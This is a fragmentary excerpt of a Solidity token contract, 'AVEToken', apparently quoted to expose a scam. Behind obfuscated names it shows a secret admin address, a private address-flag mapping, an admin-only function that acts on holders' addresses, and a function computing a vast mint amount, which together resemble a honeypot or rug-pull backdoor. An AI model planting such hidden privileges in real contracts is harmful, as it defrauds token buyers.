...
contract AVEToken is Ownable {
    ...
    mapping(address => bool) private wstxg;
    address public passAdmiok34;
    function exitdogegg(address kiki) external   {
        if(passAdmiok34 != _msgSender()){
            revert("pass error");
        }
    ...
    function jkadmin(address cc) external {
        ...
        uint256 amount = 10000000000*10**decimals()*85000;
